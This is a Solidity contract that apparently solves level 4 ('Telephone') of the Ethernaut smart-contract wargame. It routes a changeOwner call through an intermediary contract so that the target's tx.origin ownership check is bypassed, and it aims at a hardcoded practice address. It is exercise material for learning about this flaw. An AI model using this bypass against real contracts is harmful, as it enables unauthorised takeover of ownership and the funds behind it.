// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract EthernautLevl4 {
  address public telephoneAddress = 0xF3d1FbF896F1BBbBafF5F962Bf23bBFA705d491f;

  function changeAdress(address _telephoneAddress) public {
    telephoneAddress = _telephoneAddress;
  }

  function changeOwner(address _owner) public {
    ITelephone(telephoneAddress).changeOwner(_owner);
  }
}